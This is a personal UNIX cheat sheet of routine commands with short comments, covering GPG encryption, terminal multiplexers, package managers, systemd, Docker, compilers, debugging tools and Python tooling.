-*- eval: (visual-line-mode 0) -*- #
# .always_forget.txt
#
# awdeorio's UNIX cheat sheet
#
# Andrew DeOrio <awdeorio@umich.edu>

# Users and Groups
adduser USER                            # add USER (Debian)
openssl req -newkey rsa:2048 -nodes -x509 -days 365 # generate server key
openssl req -newkey rsa:4096 -nodes -x509 -days 365 # generate server key, 4096
openssl s_client -showcerts -connect www.google.com:443  # Show certificate
zip --encrypt -r DIR DIR                # create encrypted zip archive

# GPG debug
gpg --version                           # Verify version 2
gpg --list-keys                         # Verify your keypair is present
gpgconf --kill gpg-agent                # Restart gpg-agent
gpgconf --launch gpg-agent              # Restart gpg-agent
echo hello | gpg --clearsign            # Verify basic functionality

# GPG configuration
gpg --homedir ~/gnupg_tmp/              # Use another GPG config
GNUPGHOME=~/gnupg_tmp gpg               # Use another GPG config

# GPG Agent
gpgconf --kill gpg-agent                # Stop gpg-agent
gpgconf --launch gpg-agent              # Start gpg-agent
echo RELOADAGENT | gpg-connect-agent    # Reload gpg-agent

# GPG public key management
gpg -k                                  # List public keys
gpg -K                                  # List secret keys
gpg --search-keys awdeorio              # Search for public key
gpg --search-keys awdeorio --keyserver pgp.mit.edu  # Change key server
gpg --recv-key KEYID                    # Download and add public key
gpg --recv-key --keyserver pool.sks-keyservers.net  KEYID  # Change key server

# GPG create key pair
gpg --full-generate-key                 # Create GPG public/private key pair
gpg --armor --export KEYID              # Print public key
gpg --armor --export-secret-keys KEYID  # Print private key
gpg --export -a > ~/allpublickeys.asc   # Backup public keys
gpg --import < ~/allpubkeys.asc         # Restore backup of public keys
gpg --send-keys KEYID                   # Public key to public keyserver
gpg --list-options show-photos --fingerprint KEYID  # Show attached photo

# GPG asymmetric encryption (sign and seal)
gpg --encrypt --recipient awdeorio@umich.edu MESSAGE.txt  # Encrypt
gpg -e -r awdeorio@umich.edu MESSAGE.txt                  # Encrypt
gpg --decrypt MESSAGE.txt.gpg                             # Decrypt
gpg -d MESSAGE.txt.gpg                                    # Decrypt

# GPG symmetric encryption
gpg --symmetric MESSAGE.txt                               # Encrypt
gpg -c MESSAGE.txt                                        # Encrypt
gpg --decrypt MESSAGE.txt.gpg                             # Decrypt
gpg -d MESSAGE.txt.gpg                                    # Decrypt
gpg -c --batch --passphrase $KEY MESSAGE.txt              # Encrypt, pw in var
gpg -d --batch --passphrase $KEY MESSAGE.txt.gpg          # Decrypt, pw in var
gpg -c --batch --passphrase-file key.txt MESSAGE.txt      # Encrypt, pw in file
gpg -d --batch --passphrase-file key.txt MESSAGE.txt.gpg  # Decrypt, pw in file

# GPG example: encrypt a file with awdeorio's public key
curl -sSL https://andrewdeorio.com/assets/awdeorio.asc | gpg --import -
gpg --always-trust -r awdeorio -e FILE.txt
gpg -d FILE.txt.gpg > FILE.txt          # Only awdeorio can decrypt

# GPG example: encrypt a file with awdeorio's public key, long version
mkdir ~/gnupgtmp
export GNUPGHOME=~/gnupgtmp
chmod 700 $GNUPGHOME
wget https://andrewdeorio.com/assets/awdeorio.asc
gpg --import awdeorio.asc
gpg -r awdeorio -e secret.txt
unset GNUPGHOME
gpg -d secret.txt.gpg  # Only awdeorio can decrypt

# GPG example: encrypt a directory with awdeorio's public key
curl -sSL https://andrewdeorio.com/assets/awdeorio.asc | gpg --import -
tar -cz FILE | gpg --always-trust -r awdeorio -e -o FILE.tar.gz.gpg
gpg -d FILE.tar.gz.gpg | tar -xz        # Only awdeorio can decrypt

# GPG example: encrypt a file with a key
gpg -c FILE.txt                         # Encrypt with prompt for key
gpg -d FILE.txt.gpg > FILE.txt          # Decrypt with prompt for key

# GPG example: enrypt a directory with a key
tar -cz DIR/ | gpg -c -o DIR.tar.gz.gpg # Encrypt with prompt for key
gpg -d DIR.tar.gz.gpg | tar -xz         # Decrypt with prompt for key

# GPG example: sign a message with your private key.  The output will include
# the original plaintext and a signature created using your private key.  Good
# for voting by email.  Verifiable that you wrote this message.
# https://futureboy.us/pgp.html#SigningPlaintext
gpg --clearsign FILE.txt                # Sign
gpg --verify FILE.txt.asc               # Verify signed message

# GPG example: sign an executable with your private key.  The output will
# include *only* the signature create using your private key.  Good for making
# sure an executable wasn't modified.
# https://futureboy.us/pgp.html#DetachedSignature
gpg --detach-sign FILE.exe              # Sign
gpg --verify FILE.exe.sig               # Verify signed FILE.exe

# Keybase https://keybase.io/docs/the_app/install_macos
keybase help                            # Show subcommands
keybase prove twitter                   # Link a twitter account
keybase id br                           # Show info on user "br"

# Serial ports
dmesg | grep /dev/tty                   # recently connected devices
screen /dev/ttyACM0 9600                # text input/output at 9600 Baud
                                        #   Ctrl-A,Shift-K to quit
# Virtual terminals
screen                     # start virtual terminal
screen -S NAME             # start virtual terminal named NAME
screen -r NAME             # attach to NAME
screen -ls                 # list sessions
[screen] C-a d             # detach
tmux                       # start virtual terminal
tmux new -s NAME           # start virtual terminal named NAME
tmux attach                # attach
tmux a                     # attach
tmux a -t NAME             # attach to NAME
tmux ls                    # list sessions
tmux kill-session -t NAME  # kill session NAME
[tmux] C-b d               # detach
[tmux] C-b 0               # select window 0
[tmux] C-b n               # next window
[tmux] C-b p               # previous window

# Shared virtual terminal
alice@alicehost> ssh SERVER
bob@bobhost    > ssh SERVER
alice@SERVER   > tmux new -s shared
bob@SERVER     > tmux attach -t shared

# Meta commands
watch CMD                  # run CMD over and over
watch -n0.5 CMD            # run CMD every 0.5s
tail -f FILE               # watch file for appends
...|xargs CMD              # run CMD on all lines of input, all at once
...|xargs -n1 CMD          # run CMD on each line of input, one at a time
...|xargs -n1 emacs        # launch emacs one at a time for several files
...|xargs -n1 realpath | xargs -n1 emacs  # ^^^ handle relative file paths
...|xargs -n10 CMD         # process files in batches on 10
...|xargs -o emacs         # Reopen stdin, useful for interactive app (BSD)
...|xargs sh -c 'emacs "$@" < /dev/tty' emacs  # ^^^ BSD and GNU

# Change a bunch of file extensions
ls *.txt | sed 'p;s/.C$/.cpp/' | xargs -L2 mv -v

# Change a bunch of files to filenames based on their sha1sum
sha1sum *.jpg | awk '{print $2 " " $1 ".jpg"}' | xargs -L1 cp -v

# Cron
crontab -l                              # display current crontab
crontab -r                              # remove current crontab
crontab -e                              # edit current crontab
/etc/cron.d/                            # cron configs picked up automatically
/etc/crontab format:
 +---------------- minute (0 - 59)
 |  +------------- hour (0 - 23)
 |  |  +---------- day of month (1 - 31)
 |  |  |  +------- month (1 - 12)
 |  |  |  |  +---- day of week (0 - 6) (Sunday=0 or 7)
 |  |  |  |  |
 *  *  *  *  *  command to be executed

# Log Rotate
logrotate --debug                       # dry run with verbose print
logrotate --force FILE.conf             # force a rotation
/etc/logrotate.d/                       # app-specific configuration goes here
/etc/cron.daily/logrotate               # logrotate scheduled by cron

# LaTeX
detex FILE.tex                          # Remove LaTeX markup
detex FILE.tex | sed -r 's/ *& */,/g'   # LaTeX table to CSV

# Randomness
shuf                                    # shuffle lines
shuf -i 1-100 -n 1                      # Random number between [1, 100]
dd bs=1M count=1 if=/dev/urandom of=FILE# create a 1M file with random content
echo "USER:`openssl rand -base64 32 | head -c32`" | chpasswd  # ^^^ and set it
pwgen 16                                # Random string, 16 chars
pwgen -y                                # ^^^ with punctuation
cat /dev/urandom|tr -dc A-Za-z0-9|head -c16  # Random string, 16 chars
openssl rand -base64 16                 # Random string, 16 chars


########################################
# Windows / Cygwin

# open a file as if you double-clicked it
cygstart.exe FILE


########################################
# OSX
open FILE                               # open a file, same as double-click
open -a "Google Chrome" FILE            # open a file with Firefox
open -a firefox -n                      # Firefox new window
open -a firefox -n --args --private-window # Firefox new private window
pbcopy < FILE                           # copy contents of FILE to clipboard
echo | pbcopy                           # command output -> clipboard
opendiff FILE1 FILE2 [-merge FILE3]     # graphical diff
diskutil unmount /Volumes/USB_DISK      # Unmount USB_DISK
rm ~/.Trash/*                           # Empty trash
dseditgroup -o create -u USER -p GROUP  # create GROUP
dseditgroup -o edit -u USER1 -p -a USER2 -t user GROUP # Add USER2 to GROUP

# Upgrade procedure
# Do this on primary laptop, backup laptop, and desktop
brew update
brew upgrade
brew cleanup
pip3 install --upgrade pip setuptools wheel
softwareupdate --list
softwareupdate -i -a
cd ~ && git fetch -p && git rebase      # update Git-controlled dot files
backup                                  # primary laptop only

# Wifi management
ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/sbin
networksetup -listallhardwareports      # Find network inferface name
networksetup -setairportpower en0 on    # Turn on wifi
airport -s                              # Scan wireless networks
networksetup -setairportnetwork en0 SSID PASSWORD # Connect to wifi network
airport -I                              # Print current wireless status
networksetup -listnetworkserviceorder   # priority of NICs

# Create bootable live USB
# ref: http://www.ubuntu.com/download/desktop/create-a-usb-stick-on-mac-osx
hdiutil convert -format UDRW -o target.img SOURCE.iso
mv target.img.dmg target.img
diskutil list
diskutil unmountDisk /dev/diskN
sudo dd if=./target.img of=/dev/rdiskN bs=1M # change 1M->1m for
diskutil eject /dev/diskN

# Get rid of annoying "damaged and can't be opened" message for downloads
xattr -r -d com.apple.quarantine /Users/awdeorio/mnt/finance

# Homebrew (OSX)
brew install PACKAGE                    # install PACKAGE
brew uninstall PACKAGE                  # remove PACKAGE
brew update                             # update package index
brew upgrade                            # upgrade installed packages
brew cleanup                            # remove tarballs, installers, etc.
brew list                               # list installed casks and formulae
brew outdated                           # list outdated packages
brew update                             # update package index (includes cask)
brew linkapps                           # link to /Applications/
brew uses --installed                   # reverse dependency lookup
brew shellenv                           # list suggested environment variables

# Services
brew services list                      # list startup services
brew services run SERVICES              # Start w/o register launch at login
brew services start SERVICE             # Start and register launch at login
brew services stop SERVICE              # Stop and unregister launch at login
brew services restart SERVICE           # Restart and register launch at login
brew services restart -v -d SERVICE     # ^^^ with more info
launchctl unload  /System/Library/LaunchDaemons/ssh.plist  # stop SSH server
launchctl load  /System/Library/LaunchDaemons/ssh.plist    # start SSH server

########################################
# Linux Distro or Package Specifics

# What distro is this?
lsb_release                             # print distribution information
lsb_release -a                          # print distribution information
cat /etc/lsb_release                    # print distribution information

# emerge (Gentoo)
/usr/portage/profiles/use.desc
/usr/portage/profiles/use.local.desc

# rpm (RedHat and derivatives)
rpm -vh                                 # verbose, print hash-mark progress bar
rpm -ivh PACKAGE.rpm                    # install
rpm -Uvh PACKAGE.rpm                    # upgrade
rpm -Uvh --replacepkgs PACKAGE.rpm      # reinstall
rpm -ev PACKAGE                         # uninstall
rpm --replacefiles                      # allow overwriting config files
rpm --force                             # replace files and packages
rpm -q PACKAGE                          # check if PACKAGE is installed
rpm2cpio FILE.rpm | cpio -idmv          # extract files from rpm
rpmbuild -bp                            # %prep
rpmbuild -bc                            # %prep, %build
rpmbuild -bi                            # %prep, %build, %install
rpmbuild -bl                            # Make sure all %files exist
rpmbuild -ba                            # Build binary and source packages
rpmbuild -bs                            # Build only source package
rpmbuild -bb                            # Build only binary package
tar -tvf RPMFILE                        # List rpm contents
tar -xvf RPMFILE                        # Unpack rpm contents

# yum (RedHat and derivatives)
yum update                              # Update repository
yum search PACKAGE                      # Search for PACKAGE
yum install PACKAGE                     # Install PACKAGE system-wide
yum install yum-utils                   # Install dev tools, step 1
yum groupinstall development            # Install dev tools, step 2
yum install epel-release                # Extra Packages for Enterprise Linux
yum list installed                      # Show installed packages
yum repolist                            # Show enabled package repos
yum repolist -v                         # Show all package repos
yum -y                                  # Assume "yes" and don't ask

# SELinux
# https://wiki.centos.org/HowTos/SELinux
sestatus                                # Show status and policy
tail /var/log/audit/audit.log           # See permission denials
setsebool -P httpd_can_network_connect 1# Allow HTTP daemon connect to network
yum install attr                        # Install getfattr
getfattr -m security.selinux -d FILE    # Show extended attributes of a file
ls -Z FILE                              # Show extended attributes of a file
chcon -v --type=httpd_sys_content_t     # Give web server access to a dir
chcon -Rv --type=httpd_sys_content_t    # Give web server access to a dir+files

# apt (Debian-based systems)
apt-get install                         # install package
apt-get remove                          # remove package
apt-get purge                           # remove package and config files
apt-get update                          # update repository
apt-get upgrade                         # upgrade packages, but NOT kernel
apt-get autoremove                      # remove unused package deps
apt-get dist-upgrade                    # upgrade packages, including kernel
apt-get download PACKAGE                # download .deb
apt-cache search PACKAGE                # find packages
apt-cache show PACKAGE                  # get the details on a package
dpkg --get-selections | grep -v deinstall # list installed packages
dpkg --get-selections | grep PACKAGE    # see if package is installed
dpkg -i PACKAGE.deb                     # Install

# apt vs. apt-get and apt-cache
apt install                             # AKA apt-get install
apt remove                              # AKA apt-get remove
apt purge                               # AKA	apt-get purge
apt update                              # AKA aapt-get update
apt upgrade                             # AKA apt-get upgrade
apt autoremove                          # AKA apt-get autoremove
apt full-upgrade                        # AKA apt-get dist-upgrade
apt search                              # AKA apt-cache search
apt show                                # AKA apt-cache show
apt list                                # List installed, upgradable etc
apt edit-sources                        # Modify package repos

# How to take apart a .deb file
mkdir tmp && cd tmp
ar x ../FILE.deb
tar -xvzf control.tar.gz
tar -xvzf data.tar.xz

# Upstart
initctl reload-configuration            # reload configs in /etc/init/
service MYSERVICE status                # status of service
status MYSERVICE                        # status of service
service MYSERVICE start                 # start service
start MYSERVICE                         # start service
service MYSERVICE stop                  # stop service
stop MYSERVICE                          # stop service
service MYSERVICE restart               # restart service
restart MYSERVICE                       # restart service
init-checkconf /etc/init/MYSERVICE.conf # check config syntax
initctl reload-configuration            # update config (default auto updates)
sudo initctl log-priority debug         # enable debugging
initctl emit EVENT                      # manually emit an event

# Systemd
systemctl start SERVICE                 # start
systemctl stop SERVICE                  # stop
systemctl status SERVICE                # status
systemctl is-active --quiet service     # status, from a script
systemctl reload SERVICE                # reload config
systemctl restart SERVICE               # restart
systemctl enable SERVICE                # start on boot
systemctl disable SERVICE               # don't start on boot
/etc/system/systemd/                    # config file location
systemctl daemon-reload                 # restart after add or modifying config
journalctl                              # view logs
journalctl -b                           # view logs since most recent reboot
journalctl -n                           # view last 10 logs
journalctl -f                           # follow log
journalctl -u nginx.service             # view logs from nginx service
journalclt --no-pager                   # output for piping
journalctl -o json                      # output in JSON format
journalctl -o json-pretty               # output in JSON format

# Nginx
nginx -t                                # Check syntax of nginx config

# RabbitMQ
rabbitmqctl list_users                  # list users
rabbitmqctl list_permissions            # list permissions for all users
rabbitmqctl list_user_permissions USER  # list permissions for one user
rabbitmqctl add_user USER PASSWD        # add a user
rabbitmqctl delete_user USER            # remove a user
rabbitmqctl set_user_tags USER administrator  # make USER an admin

# VirtualBox
vboxmanage list vms                     # list virtual machines
vboxmanage list runningvms              # list running virtual machines
vboxmanage startvm NAME                 # start NAME virtual machine
vboxmanage startvm NAME --type headless # start, headless mode
vboxmanage controlvm NAME poweroff      # pull plug
vboxmanage controlvm NAME acpipowerbutton # halt
vboxmanage unregistervm NAME --delete   # remove
vboxmanage import FILE.ova              # import OVA
vboxmanage import FILE.ova --dry-run    # ^^^ just print
vboxmanage list bridgedifs              # list NICS available for bridging
vboxmanage modifyvm "VM Name" --bridgeadapter1 "nic name" # change bridged NIC

# Modifying OVA virtual appliances
tar -xvf vmName.ova                     # untar appliance
$EDITOR vmName.ovf                      # edit config
sha1sum vmName.ovf                      # compute new hash of config
$EDITOR vmName.mf                       # replace old hash with new hash
tar -cvf vmName-NEW.ova vmName{.ovf,-disk1.vmdk,.mf} # repackage

# Vagrant
# https://www.vagrantup.com/
vagrant init                            # create new configuration Vagrantfile
vagrant init bento/ubuntu-14.04         # create Vagrantfile for Ubuntu 14.04
vagrant init bento/ubuntu-16.04         # create Vagrantfile for Ubuntu 16.04
vagrant init bento/ubuntu-18.04         # create Vagrantfile for Ubuntu 18.04
vagrant init bento/ubuntu-20.04         # create Vagrantfile for Ubuntu 20.04
vagrant init centos/7                   # create Vagrantfile for Centos 7
vagrant init fedora/30-cloud-base       # create Vagrantfile for Fedora
vagrant up                              # boot VM, create if necessary
vagrant up --no-provision               # create VM, but don't isntall anything
vagrant up --provision                  # boot VM, force installers to run
vagrant ssh                             # connect to VM
 > cd /vagrant/                         # shared directory w/host OS
vagrant ssh-config                      # list SSH configuration
vagrant halt                            # halt VM
vagrant reload                          # reboot VM
vagrant global-status                   # all VMs on this machine
vagrant global-status --prune           # remove machines whose configs are gone
VAGRANT_VAGRANTFILE=Vagrantfile2        # alternate Vagrantfile
VAGRANT_DOTFILE_PATH=/path/to/.vagrant  # useful together with ^^^

# Docker Server on macOS
brew cask install docker                # Install
open /Applications/Docker.app           # Start VM
docker version                          # Verify connection

# Docker Server on Linux
sudo systemctl start docker             # Start service
systemctl status docker                 # Status service
sudo systemctl stop docker              # Stop server

# Docker
docker ps                               # Show running containers
docker run jameslp/eecs485:19           # Run container, download if needed
docker run -it                          # Run interactive with pseudo-TTY
docker run -d
docker run --rm
docker cp FILE CONTAINER:DEST           # Copy from host into running container
docker exec CONTAINER CMD               # Run CMD in running container
docker attach $CONTAINER                # Attach terminal to running container
docker images                           # List available images
docker images -a                        # List all images
docker system prune                     # Remove dangling images
docker system prune -a                  # Remove stopped images
docker build .                          # Build image
docker build . -t TAG                   # Build image and name it
docker build -t foo . && docker run -it foo  # Quick start build-and-run
docker login                            # Test connection to DockerHub

# Docker: install Linux VM on macOS (deprecated)
brew install docker docker-machine      # Install
brew cask install virtualbox            # Install
docker-machine create --driver virtualbox default  # Create Linux VM
docker-machine start                    # Start Linux VM
docker-machine status [default]         # Status of Linux VM
docker-machine ls                       # Show Docker VMs
docker-machine env default              # Show Docker environment variables
eval "$(docker-machine env default)"    # Set Docker environment variables
docker run hello-world                  # Run sanity check docker machine
docker-machine stop default             # Stop Linux VM

# Docker: install on Ubuntu
# https://www.digitalocean.com/community/tutorials/how-to-install-and-use-docker-on-ubuntu-18-04
apt update
apt install apt-transport-https ca-certificates curl software-properties-common
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable"
apt update
sudo usermod -aG docker ${USER}
docker run hello-world

# Environment Modules
# http://modules.sourceforge.net/
module load vscode                      # add software to PATH
module load vscode/1.19.2               # add specific SW version to PATH
module unload vscode                    # remove software from PATH
module switch vscode/1.19.2             # change version
module list                             # show loaded modules
module clear                            # clear all loaded modules
module apropos                          # search module name and description
module avail -t 2>&1 | grep vscode      # search module name (deprecated)
module key vscode                       # search module name

# C++ compilation
gcc -Wall -Werror -std=c89 -ansi        # compile ISO C
g++ -Wall -Werror -pedantic             # compile ISO C++
g++ -Wall -Werror -pedantic -std=c++11  # compile ISO C++11
g++ -g                                  # compile with debug support
g++ -Wfatal-errors                      # stop after one error
g++ -E FILE.cpp -o FILE.ii              # stop after preprocessing
g++ -S FILE.ii -o FILE.s                # stop after compilation proper
g++ -c FILE.s -o FILE.o                 # stop after assembling
g++ FILE.o -o FILE                      # stop after linking (all done!)
echo $LD_LIBRARY_PATH                   # run time library resolution
echo $LIBARY_PATH                       # gcc static library search path, gcc -L
echo $LD_RUN_PATH                       # gcc link time library resolution
echo $CPATH                             # gcc search path, gcc -I
echo $C_INCLUDE_PATH                    # ^^^ for C
echo $CPLUS_INCLUDE_PATH                # ^^^ for C++
ldd EXE                                 # show dynamically loaded libraries

# Debug with gdb
g++ -g                                  # compile
gdb ./a.out                             # run
gdb -tui ./a.out                        # run, "CLI-based" GUI

# Debug with lldb
# Cheat sheet https://lldb.llvm.org/lldb-gdb.html
g++ --version                           # verify that g++ is really clang
g++ -g                                  # compile
lldb ./a.out                            # run

# Dynamic analysis with valgrind
valgrind -v ./a.out                     # Check for undefined behavior
valgrind -v --leak-check=full ./a.out   # Check for memory leaks
valgrind --tool=callgrind ./a.out       # Instruction count
valgrind --tool=callgrind --simulate-cache=yes  # Instruction count w/ cache
callgrind_annotate callgrind.out.12345  # Instruction count summary
valgrind --tool=massif ./a.out          # Memory consumption
valgrind --tool=massif --stacks=yes ./a.out  # Memory consumption w/ stack
ms_print massif.out.12345               # Memory consumption summary
# Dynamic analysis with address sanitizer (ASAN)
clang++ -fsanitize=address              # Compile (OSX)
g++ -fsanitize=address                  # Compile (GNU)
./a.out                                 # Run
ASAN_OPTIONS=help=1 ./a.out             # Help
ASAN_OPTIONS=verbosity=2 ./a.out        # Verbose

# Dynamic analysis (leak checking) with macOS leaks
leaks -quiet -atExit -- ./a.out

# Dynamic analysis with bounds checking (GNU GCC only)
g++ -D_GLIBCXX_DEBUG                    # Compile
./a.out                                 # Run

# Static analysis
pmd cpd --language cpp --minimum-tokens 50 --files *.cpp  # code duplication
oclint *.cpp                            # style
cppcheck *.cpp                          # undefined behavior checks

# Profile with gprof
g++ -pg                                 # compile
gprof ./a.out gmon.out > analysis.txt     # analyze

# Profile with perf
# TODO: https://jvns.ca/debugging-zine.pdf
g++ -g                                  # compile
perf record -g ./a.out                  # run
perf report                             # analyze

# Coverage with gcov
# To measure coverage of a suite of unit and system tests, be sure to compile
# using the separate compilation model.
g++ --version                           # verify that g++ is GNU, not clang
g++ -g --coverage FILE.cpp              # compile
./a.out                                 # run
gcov FILE.cpp                           # analyze
grep '^#####' test.cpp.gcov             # show lines that didn't execute

# GNU Make
make                                    # Build the first target in Makefile
make -f FILE                            # Use FILE as Makefile
make -d                                 # Print debugging information
make -jN                                # Run N parallel jobs
make -k                                 # Keep going after error, if possible
make -n                                 # Dry run
make -r                                 # Eliminate built-in implicit rules

# Binary tools
# OSX: brew install binutils; then use gobjdump
strings FILE                            # find printable strings in an object
objdump -D file.o                       # disassemble
hexdump                                 # binary -> hex (check endianness!)
xxd                                     # binary -> hex (check endianness!)

# LastPass CLI
brew install lastpass-cli --with-pinentry  # install (OSX)
lpass login awdeorio@gmail.com          # start agent
lpass logout                            # stop agent
lpass status                            # check agent
lpass ls                                # list saved passwords
lpass show amazon.com                   # show one saved password
lpass show --password amazon.com --clip # copy one password to clipboard
lpass show -p amazon.com -c             # copy one password to clipboard
lpass export                            # dump to plain text CSV
lpass edit amazon.com                   # edit entry using $EDITOR
encfs --extpass 'lpass show ID --password' # LastPass + encfs

# JSON
echo '{"json":"obj"}' | python -m json.tool    # Pretty-print
echo '{"json":"obj"}' | jq                     # Pretty-print
echo '{"json":"obj"}' | jsonlint               # Lint
jq '.'                                  # Identity filter
jq '.results'                           # Filter value from key "results"
jq '."results"[]["name"]'               # Filter nested values from a list
python -c 'import sys, json; print json.load(sys.stdin)["results"]'  # ^^^

# XML
cat FILE.xml | python2 -c 'import sys;import xml.dom.minidom;s=sys.stdin.read();print xml.dom.minidom.parseString(s).toprettyxml()'  # Pretty print
cat FILE.xml | xmlstarlet format        # Pretty print

# HTML
tidy FILE.html  # Pretty print HTML


########################################
# Java
java -jar myprog.jar                    # run a java program
jar -xvf                                # extract all files from jar archive


########################################
# Perl
cat FILE | perl -pe 's///'              # apply line of Perl to each input line
perl -V                                 # debug environment
PERL5LIB                                # environment variable for tool installs
cpan -i PACKAGE                         # install package
perl -pe 's/\\\\n/ /'                   # remove continuation lines (backslash)
perl -0pe 's/QUERY/REPLACE/sm'          # multiline regex query-replace
perl -i -pe                             # edit in place (like sed -i)


########################################
# Python

# Options
python -m MODULE                        # load module and execute main()
python -c "CODE"                        # execute CODE
python -m site                          # Display configuration

# Search path for libraries
echo $PYTHONPATH                        # Python library search path
echo $PYTHONUSERBASE                    # Base dir, e.g., ${HOME}/.local
echo $PYTHONSTARTUP                     # Interactive interpreter startup
python -c 'import sys; print("\n".join(sys.path))'

# Python install
apt-get install python3 python3-pip python3-venv python3-wheel python3-setuptools  # Linux
brew install python3                    # MacOS

# Anaconda Python
# https://docs.anaconda.com/anaconda/install/uninstall/
~/anaconda3/bin/conda init              # Permanently activate
conda init --reverse                    # Permanently deactivate
conda deactivate                        # Temporarily deactivate

# Python virtual environment
virtualenv venv                         # create, Python2
python3 -m venv .venv                   # create, Python3
source ./venv/bin/activate              # enable, bash
. ./venv/bin/activate                   # enable, csh, etc.
deactivate                              # disable

# Python pip
pip install PACKAGE                     # install Python package
pip install --upgrade PACKAGE           # upgrade Python package
pip install -e .                        # install local Python package for dev
pip install --upgrade --upgrade-strategy=eager -e .  # upgrade setup.py
pip install --user PACKAGE              # install to ~/.local/
pip list                                # list install packages
pip freeze                              # ^^^ in requirements format
pip freeze --exclude-editable           # ^^^ excluding editable package

# Python pipenv
# Docs: https://docs.pipenv.org/  http://docs.pipenv.org/advanced/
pip3 install pipenv                     # System-wide pipenv install
pipenv --where                          # Output project home path
pipenv --venv                           # Output project virtual env path
pipenv --three                          # Create virtual environment, Pipfile
PIPENV_VENV_IN_PROJECT pipenv --three   # ^^^ inside $(pwd)/.venv/
pipenv install PACKAGE                  # Install PACKAGE into venv
pipenv uninstall PACKAGE                # Remove PACKAGE from venv
pipenv shell                            # Activate virtual environment
pipenv run CMD                          # Run CMD in virtual environment

# Python pyenv
pyenv versions                          # List installed versions
pyenv install --list                    # List versions available for install
pyenv install 3.6.6                     # Install Python-3.6.6
pyenv shell 3.6.6                       # Set 3.6.6 as default python temp
pyenv global 3.6.6                      # Set 3.6.6 as global python version
pyenv root                              # Location of local Python installs
eval "$(pyenv init -)"                  # Activate pyenv in bashrc

# Python debugging with pdb
>>> import pdb; pdb.set_trace();        # Break, enter debug shell
>>> breakpoint()                        # Break, enter debug shell (Python3)
python -m pdb script.py                 # Break at beginning of program
>>> pdb.Pdb(skip=['django.*']).set_trace()  # Do not step into library code

# Python debugging with pdbpp https://pypi.python.org/pypi/pdbpp/
$ pip install pdbpp
>>> import pdb; pdb.set_trace()         # Break, enter debug shell
> sticky                                # Show code listing with shell prompt
> pp OBJECT                             # pretty-print OBJECT

# Python debugging with pdb inside Emacs
M-x pdb
Run pdb (like this): python3 -m pdb FILE.py

# Python style
pycodestyle                             # PEP8 check
pydocstyle                              # PEP257 check
pylint                                  # Bug and quality check
pylint --output-format colorized        # Colored output

# Python unittest
python -m unittest MODULE               # Run all tests in MODULE
python -m unittest MODULE.CLASS         # Run all tests in CLASS
python -m unittest MODULE.CLASS.FXN     # Run one test function

# Python pytest
python -m pytest                        # Run all tests
pytest                                  # Run all tests
pytest FILE::FXN                        # Run one test function
pytest FILE::CLASS::FXN                 # Run one test member function
pytest --pdb                            # Drop to pdb after a failure
pytest --trace                          # Drop to pdb at beginning of test
pytest -x                               # Exit on first error
pytest -s                               # Do not capture stdout
pytest --runxfail                       # Run tests marked as expected failures
pytest --last-failed                    # Rerun only tests that failed last run
pytest --showlocals                     # Dump local variables for debugging
pytest --reuse-db                       # Reuse test DB
pytest --create-db                      # Re-create test DB
pytest -vvsx                            # Verbose, show stdout, stop on error
pytest --log-cli-level=INFO             # Change log level
pytest -p no:logging                    # Override log level, e.g. in pytest.ini
pytest --tb=line                        # Less output from many failures
pytest --collect-only --verbosity=-1    # List test names
pytest --cov MODULE                     # Measure coverage with pytest-cov
pytest --cov --cov-report term-missing  # ^^^ show line nos missed by tests
coverage annotate                       # Create *.py,cover showing LOC coverage

# Python tox CLI
tox                                     # Run all tests
tox -e py3                              # Run one test environment
tox -vv                                 # Show debug info

# Python Source Distributions
python setup.py sdist                   # Create dist in ./dist/

# Quick web server serving files in PWD on port 8000
python2 -m SimpleHTTPServer
python3 -m http.server

# Python dead code search
vulture PATH


########################################
# Python / IPython
# AKA Jupyter Notebook, `ipdb`, or Django's `manage.py shell`

# Execute a Jupyter Notebook in headless mode.  Clears all output, runs the
# entire notebook, and writes the result to an output .ipynb file
# NOTE: `ipython nbconvert` is buggy and incorrectly times out long jobs
pip install runipy
runipy -o NOTEBOOK.ipynb

# Jupyter Notebook server on a remote server
jupyter-notebook --ip 0.0.0.0 --no-browser

# Jupyter Notebook on a remote server behind a firewall (local port forwarding)
remotehost> jupyter-notebook
